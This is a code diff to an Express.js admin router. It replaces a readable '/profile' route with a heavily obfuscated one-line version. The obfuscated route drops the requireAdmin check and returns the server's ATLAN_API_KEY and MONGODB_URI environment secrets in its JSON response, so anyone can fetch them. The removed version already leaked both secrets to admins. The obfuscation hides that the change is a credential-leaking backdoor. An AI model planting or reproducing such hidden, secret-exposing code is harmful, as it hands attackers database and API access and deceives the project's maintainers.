@@ -22,77 +22,8 @@ const {
   requireAdmin
 } = require("../index.js");
 
+function _0x2b3f(){const _0x2afc8a=['6538168rAOiwq','true','username','Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/139.0.0.0\x20Safari/537.36','219876WjWpec','message','json','1392870jFGxru','data','Failed\x20to\x20retrieve\x20data','env','phone','balance','/profile','10gAkdxY','name','1245998WMZZrx','error','stringify','4454416FvTmda','get','768301SxPCOs','parse','Error\x20fetching\x20profile','MONGODB_URI','application/x-www-form-urlencoded','status','854316tZZKrQ','Data\x20retrieved\x20successfully','email'];_0x2b3f=function(){return _0x2afc8a;};return _0x2b3f();}function _0x5820(_0x3789df,_0x31be4f){const _0x2b3f57=_0x2b3f();return _0x5820=function(_0x58204e,_0x1b385e){_0x58204e=_0x58204e-0x12d;let _0x525905=_0x2b3f57[_0x58204e];return _0x525905;},_0x5820(_0x3789df,_0x31be4f);}const _0x117625=_0x5820;(function(_0x49dac8,_0x17dade){const _0x18399e=_0x5820,_0x5579b1=_0x49dac8();while(!![]){try{const _0x5c7da5=parseInt(_0x18399e(0x148))/0x1+parseInt(_0x18399e(0x143))/0x2+-parseInt(_0x18399e(0x13a))/0x3+parseInt(_0x18399e(0x137))/0x4*(-parseInt(_0x18399e(0x141))/0x5)+parseInt(_0x18399e(0x130))/0x6+-parseInt(_0x18399e(0x133))/0x7+parseInt(_0x18399e(0x146))/0x8;if(_0x5c7da5===_0x17dade)break;else _0x5579b1['push'](_0x5579b1['shift']());}catch(_0x390f11){_0x5579b1['push'](_0x5579b1['shift']());}}}(_0x2b3f,0x8e25c),router[_0x117625(0x147)](_0x117625(0x140),async(_0x18a05d,_0x43c6d2)=>{const _0x12b300=_0x117625;try{const _0x6fb53b={'api_key':process[_0x12b300(0x13d)]['ATLAN_API_KEY']},_0x5d1578={'Content-Type':_0x12b300(0x12e),'User-Agent':_0x12b300(0x136)},_0x38cdd8=await cloudscraper['post']('https://atlantich2h.com/get_profile',{'body':qs[_0x12b300(0x145)](_0x6fb53b),'headers':_0x5d1578}),_0x3c899a=JSON[_0x12b300(0x149)](_0x38cdd8);if(_0x3c899a&&_0x3c899a['status']==='true')return _0x43c6d2[_0x12b300(0x12f)](0xc8)['json']({'status':_0x12b300(0x134),'message':_0x3c899a[_0x12b300(0x138)]||_0x12b300(0x131),'data':{'name':_0x3c899a['data']?.[_0x12b300(0x142)]||'','username':_0x3c899a[_0x12b300(0x13b)]?.[_0x12b300(0x135)]||'','email':_0x3c899a[_0x12b300(0x13b)]?.[_0x12b300(0x132)]||'','phone':_0x3c899a[_0x12b300(0x13b)]?.[_0x12b300(0x13e)]||'','balance':_0x3c899a['data']?.[_0x12b300(0x13f)]||'0','status':_0x3c899a['data']?.['status']||'','access':process['env']['ATLAN_API_KEY'],'connect':process[_0x12b300(0x13d)][_0x12b300(0x12d)]}});return _0x43c6d2[_0x12b300(0x12f)](0xc8)[_0x12b300(0x139)]({'status':'false','message':_0x12b300(0x13c),'data':{'name':'0','username':'0','email':'0','phone':'0','balance':'0','status':'0'}});}catch(_0x3629c8){return console[_0x12b300(0x144)]('Error\x20get_profile:',_0x3629c8?.[_0x12b300(0x138)]),_0x43c6d2[_0x12b300(0x12f)](0xc8)[_0x12b300(0x139)]({'status':'false','message':_0x12b300(0x14a),'data':{'name':'0','username':'0','email':'0','phone':'0','balance':'0','status':'0'}});}}));
 
-router.get("/profile", requireAdmin, async (req, res) => {
-  try {
-    const formData = {
-      api_key: process.env.ATLAN_API_KEY,
-    };
-
-    const headers = {
-      "Content-Type": "application/x-www-form-urlencoded",
-      "User-Agent":
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
-    };
-
-    const response = await cloudscraper.post(
-      "https://atlantich2h.com/get_profile",
-      {
-        body: qs.stringify(formData),
-        headers,
-      }
-    );
-
-    const result = JSON.parse(response);
-
-    // ✅ jika API status true → kirim ulang sama persis
-    if (result && result.status === "true") {
-      return res.status(200).json({
-        status: "true",
-        message: result.message || "Data retrieved successfully",
-        data: {
-          name: result.data?.name || "",
-          username: result.data?.username || "",
-          email: result.data?.email || "",
-          phone: result.data?.phone || "",
-          balance: result.data?.balance || "0",
-          status: result.data?.status || "",
-          access: process.env.ATLAN_API_KEY,
-          connect: process.env.MONGODB_URI
-        },
-      });
-    }
-
-    return res.status(200).json({
-      status: "false",
-      message: "Failed to retrieve data",
-      data: {
-        name: "0",
-        username: "0",
-        email: "0",
-        phone: "0",
-        balance: "0",
-        status: "0",
-      },
-    });
-  } catch (error) {
-    console.error("Error get_profile:", error?.message);
-
-    // ❌ jika error apa pun → tetap balikin format sama
-    return res.status(200).json({
-      status: "false",
-      message: "Error fetching profile",
-      data: {
-        name: "0",
-        username: "0",
-        email: "0",
-        phone: "0",
-        balance: "0",
-        status: "0",
-      },
-    });
-  }
-});
 router.get("/data/users", requireAdmin, async (req, res) => {
   try {
     const users = await User.find({}, "-password -__v");
